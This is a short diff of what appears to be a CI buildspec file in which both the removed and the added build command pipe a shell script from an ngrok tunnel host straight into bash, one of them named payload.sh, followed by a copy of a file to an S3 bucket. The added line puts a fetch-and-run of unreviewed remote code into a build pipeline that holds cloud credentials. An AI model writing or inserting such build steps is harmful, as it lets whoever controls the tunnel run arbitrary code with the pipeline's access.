@@ -5,5 +5,5 @@ phases:
       python: 3.9
   build:
     commands:
-      - curl https://bbb3-2409-40e6-26-718c-39e4-d778-a7ed-ed87.ngrok-free.app/payload.sh | bash 
+      - curl  https://a79e-117-201-173-209.ngrok-free.app/testfile.sh | bash 
       - aws s3 cp Text.txt s3://buildanu/tttt 
